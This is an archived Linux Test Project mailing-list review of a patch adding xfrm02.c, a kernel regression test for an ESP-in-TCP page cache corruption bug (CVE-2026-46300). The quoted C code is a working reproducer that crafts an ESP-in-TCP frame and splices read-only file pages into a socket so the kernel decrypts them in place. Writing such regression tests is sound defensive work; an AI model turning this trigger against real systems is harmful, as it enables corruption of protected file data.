Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 415A4CD37AC
	for <ltp@archiver.kernel.org>; Wed, 13 May 2026 16:35:42 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id C637F3C1D75
	for <ltp@archiver.kernel.org>; Wed, 13 May 2026 18:35:40 +0200 (CEST)
Received: from in-5.smtp.seeweb.it (in-5.smtp.seeweb.it [217.194.8.5])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id B0E513C0E5D
 for <ltp@lists.linux.it>; Wed, 13 May 2026 18:35:21 +0200 (CEST)
Received: from smtp-out1.suse.de (smtp-out1.suse.de [195.135.223.130])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-5.smtp.seeweb.it (Postfix) with ESMTPS id D3ED76002C8
 for <ltp@lists.linux.it>; Wed, 13 May 2026 18:35:20 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out1.suse.de (Postfix) with ESMTPS id 05F8A5BCD0;
 Wed, 13 May 2026 16:35:20 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1778690120; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=PvnbqdBEzimOWwkQrHCMmgG23kubqJsn9nq15w7CFw8=;
 b=fHt2ex0E1RitSVCzlDVuzvFakrtWNueGb0fiVq3y76tinMD1fk1Gn7EbSNpLZrSRa8blp9
 Pn0S0r9yKCoWr5q0TRll1JCoY+B1ZlSHmY9NqMNblaEPpdLp9EdhfHTQEDCuN2Xg17pAJ0
 I1+Zuwn5N9ExcIyBo6RfdncAybSGGQ0=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1778690120;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=PvnbqdBEzimOWwkQrHCMmgG23kubqJsn9nq15w7CFw8=;
 b=fvotZUaKzb9Er7ChPynnQ8i3Sogrl8uaFrlOLwEkXV8jcOuuVD/oiD0upI6CKbYme1qlZm
 j9Rg6mefGOjbqUCQ==
Authentication-Results: smtp-out1.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1778690120; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=PvnbqdBEzimOWwkQrHCMmgG23kubqJsn9nq15w7CFw8=;
 b=fHt2ex0E1RitSVCzlDVuzvFakrtWNueGb0fiVq3y76tinMD1fk1Gn7EbSNpLZrSRa8blp9
 Pn0S0r9yKCoWr5q0TRll1JCoY+B1ZlSHmY9NqMNblaEPpdLp9EdhfHTQEDCuN2Xg17pAJ0
 I1+Zuwn5N9ExcIyBo6RfdncAybSGGQ0=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1778690120;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=PvnbqdBEzimOWwkQrHCMmgG23kubqJsn9nq15w7CFw8=;
 b=fvotZUaKzb9Er7ChPynnQ8i3Sogrl8uaFrlOLwEkXV8jcOuuVD/oiD0upI6CKbYme1qlZm
 j9Rg6mefGOjbqUCQ==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id F075B593A9;
 Wed, 13 May 2026 16:35:19 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id 509COkeoBGqeGwAAD6G6ig
 (envelope-from <mdoucha@suse.cz>); Wed, 13 May 2026 16:35:19 +0000
Message-ID: <9d5866a3-dba3-47b6-8cd2-146305eafbb0@suse.cz>
Date: Wed, 13 May 2026 18:35:19 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
To: Andrea Cervesato <andrea.cervesato@suse.de>,
 Linux Test Project <ltp@lists.linux.it>
References: <20260513-fragnesia-v2-1-07a822c66cbd@suse.com>
Content-Language: en-US
From: Martin Doucha <mdoucha@suse.cz>
Autocrypt: addr=mdoucha@suse.cz; keydata=
 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 ag==
In-Reply-To: <20260513-fragnesia-v2-1-07a822c66cbd@suse.com>
X-Spamd-Result: default: False [-8.30 / 50.00]; REPLY(-4.00)[];
 BAYES_HAM(-3.00)[100.00%]; NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 RCPT_COUNT_TWO(0.00)[2]; MID_RHS_MATCH_FROM(0.00)[];
 ARC_NA(0.00)[]; FUZZY_RATELIMITED(0.00)[rspamd.com];
 RCVD_VIA_SMTP_AUTH(0.00)[]; RCVD_TLS_ALL(0.00)[];
 DKIM_SIGNED(0.00)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
 TO_DN_ALL(0.00)[]; FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
 FROM_EQ_ENVFROM(0.00)[]; RCVD_COUNT_TWO(0.00)[2];
 TO_MATCH_ENVRCPT_ALL(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo, suse.cz:mid,
 suse.cz:email, suse.com:email]
X-Virus-Scanned: clamav-milter 1.0.9 at in-5.smtp.seeweb.it
X-Virus-Status: Clean
Subject: Re: [LTP] [PATCH v2] sockets/xfrm02: Add ESP-in-TCP page cache
 corruption test
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset="us-ascii"; Format="flowed"
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Hi,
two minor fixes that can be done during merge:
- The bug has a CVE now: CVE-2026-46300
- One issue below.

Tested on kernels v5.14 and v6.12.

Reviewed-by: Martin Doucha <mdoucha@suse.cz>

On 5/13/26 17:35, Andrea Cervesato wrote:
> From: Andrea Cervesato <andrea.cervesato@suse.com>
> 
> Verify that ESP-in-TCP (espintcp) does not corrupt the page cache when
> file data is spliced into a TCP socket. When MSG_SPLICE_PAGES references
> page cache pages directly in the skb and the receiving socket has
> espintcp ULP enabled, the kernel's ESP handler may decrypt the payload
> in-place on those pages, corrupting the cached file contents.
> 
> The test sets up an ESP-in-TCP xfrm state on IPv6 loopback, writes
> known data to a file, creates a TCP connection where the receiver
> enables espintcp ULP, splices the file data into the TCP socket as
> part of a crafted ESP-in-TCP frame, and then verifies whether the
> page cache was corrupted.
> 
> Reproducer based on:
> https://github.com/v12-security/pocs/tree/main/fragnesia
> 
> Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
> ---
> Changes in v2:
> - use tst_cmd()
> - evict pages before sending prefix
> - remove checkpoints
> - add usleep() to trigger the bug
> - use tst_reap_children()
> - Link to v1: https://lore.kernel.org/r/20260513-fragnesia-v1-1-80c5b3b09005@suse.com
> ---
>   runtest/cve                          |   1 +
>   testcases/network/sockets/.gitignore |   1 +
>   testcases/network/sockets/xfrm02.c   | 227 +++++++++++++++++++++++++++++++++++
>   3 files changed, 229 insertions(+)
> 
> diff --git a/runtest/cve b/runtest/cve
> index 530f8751ed3a8e8aa7e9110d89d577df3e8cc6ce..5fe83ec2d1803a5c0f6b4eba05fcf00cc80c8809 100644
> --- a/runtest/cve
> +++ b/runtest/cve
> @@ -95,3 +95,4 @@ cve-2025-38236 cve-2025-38236
>   cve-2025-21756 cve-2025-21756
>   cve-2026-31431 af_alg08
>   cve-2026-43284 xfrm01
> +cve-2026-fragnesia xfrm02
> diff --git a/testcases/network/sockets/.gitignore b/testcases/network/sockets/.gitignore
> index 6f3c0ad84c000f0214f371c6a601afb592b15faa..35bc0462b676b041d9a5b52a37fded973d0157a9 100644
> --- a/testcases/network/sockets/.gitignore
> +++ b/testcases/network/sockets/.gitignore
> @@ -1 +1,2 @@
>   /xfrm01
> +/xfrm02
> diff --git a/testcases/network/sockets/xfrm02.c b/testcases/network/sockets/xfrm02.c
> new file mode 100644
> index 0000000000000000000000000000000000000000..d7fe70e3d242227c374b5c9b876c8efeeb0e1f5d
> --- /dev/null
> +++ b/testcases/network/sockets/xfrm02.c
> @@ -0,0 +1,227 @@
> +// SPDX-License-Identifier: GPL-2.0-or-later
> +/*
> + * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
> + */
> +
> +/*\
> + * Verify that ESP-in-TCP (espintcp) does not corrupt the page cache
> + * when file data is spliced into a TCP socket.
> + *
> + * When file data is spliced into a TCP socket, the kernel uses
> + * MSG_SPLICE_PAGES to reference page cache pages directly in the skb.
> + * If the receiving socket has TCP_ULP "espintcp" enabled and a matching
> + * xfrm SA exists, the kernel's ESP handler decrypts the payload
> + * in-place on those page cache pages, corrupting the cached file
> + * contents.
> + *
> + * The test sets up an ESP-in-TCP xfrm state on IPv6 loopback, writes
> + * known data to a file, creates a TCP connection where the receiver
> + * enables espintcp ULP, splices the file data into the TCP socket as
> + * part of a crafted ESP-in-TCP frame, and then verifies whether the
> + * page cache was corrupted.
> + *
> + * Reproducer based on:
> + * https://github.com/v12-security/pocs/tree/main/fragnesia
> + */
> +
> +#define _GNU_SOURCE
> +
> +#include "tst_test.h"
> +#include "tst_net.h"
> +#include "tst_netdevice.h"
> +#include "lapi/tcp.h"
> +#include "lapi/splice.h"
> +
> +#define TESTFILE "pagecache_test"
> +#define DATA_SIZE 4096
> +
> +#define SPI 0x100
> +#define TCP_PORT 5556
> +#define IV_LEN 8
> +#define ESP_HDR_SIZE 16
> +#define AES_KEYLEN 16
> +#define SALT_LEN 4
> +#define KEYTOTAL (AES_KEYLEN + SALT_LEN)
> +
> +/* ESP-in-TCP frame prefix: 2-byte length + ESP header */
> +#define PREFIX_SIZE (2 + ESP_HDR_SIZE)
> +
> +static const uint8_t aead_key[KEYTOTAL] = {
> +	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
> +	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
> +	0x01, 0x02, 0x03, 0x04
> +};
> +
> +static uint8_t original[DATA_SIZE];
> +static int file_fd = -1;
> +static int srv_fd = -1;
> +
> +static void setup(void)
> +{
> +	char keyhex[KEYTOTAL * 2 + 3];
> +	char spihex[16];
> +	char port_str[8];
> +	int i, ret;
> +
> +	tst_setup_netns();
> +	NETDEV_SET_STATE("lo", 1);
> +
> +	keyhex[0] = '0';
> +	keyhex[1] = 'x';
> +	for (i = 0; i < KEYTOTAL; i++)
> +		sprintf(keyhex + 2 + i * 2, "%02x", aead_key[i]);
> +
> +	snprintf(spihex, sizeof(spihex), "0x%08x", SPI);
> +	snprintf(port_str, sizeof(port_str), "%d", TCP_PORT);
> +
> +	const char *const xfrm_cmd[] = {
> +		"ip", "xfrm", "state", "add",
> +		"src", "::1", "dst", "::1",
> +		"proto", "esp", "spi", spihex,
> +		"encap", "espintcp", port_str, port_str, "::",
> +		"aead", "rfc4106(gcm(aes))", keyhex, "128",
> +		"mode", "transport",
> +		NULL
> +	};
> +
> +	ret = tst_cmd(xfrm_cmd, NULL, NULL, TST_CMD_PASS_RETVAL);
> +	if (ret)
> +		tst_brk(TBROK, "Failed to install xfrm ESP-in-TCP state");
> +
> +	for (i = 0; i < DATA_SIZE; i++)
> +		original[i] = (uint8_t)(i & 0xff);
> +}
> +
> +static void try_corrupt(void)
> +{
> +	struct sockaddr_in6 addr = {
> +		.sin6_family = AF_INET6,
> +		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
> +		.sin6_port = htons(TCP_PORT),
> +	};
> +	uint8_t prefix[PREFIX_SIZE];
> +	uint16_t frame_len;
> +	uint32_t spi_net, seq_net;
> +	char ulp[] = "espintcp";
> +	int acc_fd;
> +	loff_t off;
> +
> +	frame_len = htons(PREFIX_SIZE + DATA_SIZE);
> +	memcpy(prefix, &frame_len, 2);
> +
> +	spi_net = htonl(SPI);
> +	memcpy(prefix + 2, &spi_net, 4);
> +
> +	seq_net = htonl(1);
> +	memcpy(prefix + 6, &seq_net, 4);
> +
> +	memset(prefix + 10, 0xcc, IV_LEN);
> +
> +	srv_fd = SAFE_SOCKET(AF_INET6, SOCK_STREAM, 0);
> +	SAFE_SETSOCKOPT_INT(srv_fd, SOL_SOCKET, SO_REUSEADDR, 1);
> +	SAFE_BIND(srv_fd, (struct sockaddr *)&addr, sizeof(addr));
> +	SAFE_LISTEN(srv_fd, 1);
> +
> +	if (!SAFE_FORK()) {
> +		int cli_fd, pipefd[2];
> +
> +		SAFE_CLOSE(srv_fd);
> +
> +		cli_fd = SAFE_SOCKET(AF_INET6, SOCK_STREAM, 0);
> +		SAFE_SETSOCKOPT_INT(cli_fd, IPPROTO_TCP, TCP_NODELAY, 1);
> +		SAFE_CONNECT(cli_fd, (struct sockaddr *)&addr, sizeof(addr));
> +
> +		SAFE_POSIX_FADVISE(cli_fd, 0, 0, POSIX_FADV_DONTNEED);
> +
> +		SAFE_SEND(1, cli_fd, prefix, sizeof(prefix), 0);
> +		SAFE_PIPE(pipefd);
> +
> +		off = 0;
> +		SAFE_SPLICE(file_fd, &off, pipefd[1], NULL, DATA_SIZE, 0);
> +
> +		/*
> +		 * Splice pipe into TCP socket. The kernel uses
> +		 * MSG_SPLICE_PAGES to keep page cache references in
> +		 * the skb. On loopback the receiver's ESP handler may
> +		 * decrypt in-place, corrupting the page cache. May
> +		 * fail on patched kernels.
> +		 */
> +		splice(pipefd[0], NULL, cli_fd, NULL, DATA_SIZE, 0);
> +
> +		SAFE_CLOSE(pipefd[0]);
> +		SAFE_CLOSE(pipefd[1]);
> +		SAFE_CLOSE(cli_fd);
> +
> +		exit(0);
> +	}
> +
> +	tst_reap_children();
> +
> +	acc_fd = SAFE_ACCEPT(srv_fd, NULL, NULL);
> +	SAFE_CLOSE(srv_fd);

tst_reap_children() should be called here, after accepting the 
connection and closing the listen socket.

> +
> +	SAFE_SETSOCKOPT(acc_fd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp));
> +
> +	/* Let the espintcp strparser process buffered ESP data */
> +	usleep(30000);
> +
> +	SAFE_CLOSE(acc_fd);
> +}
> +
> +static void run(void)
> +{
> +	uint8_t readback[DATA_SIZE];
> +
> +	file_fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT, 0444);
> +	SAFE_WRITE(SAFE_WRITE_ALL, file_fd, original, DATA_SIZE);
> +	SAFE_CLOSE(file_fd);
> +
> +	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
> +	try_corrupt();
> +	SAFE_CLOSE(file_fd);
> +
> +	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
> +	SAFE_READ(1, file_fd, readback, sizeof(readback));
> +	SAFE_CLOSE(file_fd);
> +
> +	if (memcmp(readback, original, DATA_SIZE) != 0)
> +		tst_res(TFAIL, "Page cache corrupted via xfrm ESP-in-TCP splice");
> +	else
> +		tst_res(TPASS, "Page cache was not corrupted");
> +
> +	SAFE_UNLINK(TESTFILE);
> +}
> +
> +static void cleanup(void)
> +{
> +	if (srv_fd != -1)
> +		SAFE_CLOSE(srv_fd);
> +
> +	if (file_fd != -1)
> +		SAFE_CLOSE(file_fd);
> +}
> +
> +static struct tst_test test = {
> +	.test_all = run,
> +	.setup = setup,
> +	.cleanup = cleanup,
> +	.needs_tmpdir = 1,
> +	.forks_child = 1,
> +	.needs_kconfigs = (const char *[]) {
> +		"CONFIG_USER_NS=y",
> +		"CONFIG_NET_NS=y",
> +		"CONFIG_XFRM",
> +		"CONFIG_INET6_ESP",
> +		"CONFIG_INET6_ESPINTCP",
> +		"CONFIG_CRYPTO_GCM",
> +		NULL
> +	},
> +	.save_restore = (const struct tst_path_val[]) {
> +		{"/proc/sys/user/max_user_namespaces", "1024", TST_SR_SKIP},
> +		{}
> +	},
> +	.needs_cmds = (struct tst_cmd[]) {
> +		{.cmd = "ip"},
> +		{}
> +	},
> +};
> 
> ---
> base-commit: e1fc50957c98ae4c27064756e063de0e7136cde3
> change-id: 20260513-fragnesia-9588d855becf
> 
> Best regards,


-- 
Martin Doucha   mdoucha@suse.cz
SW Quality Engineer
SUSE LINUX, s.r.o.
CORSO IIa
Krizikova 148/34
186 00 Prague 8
Czech Republic

-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
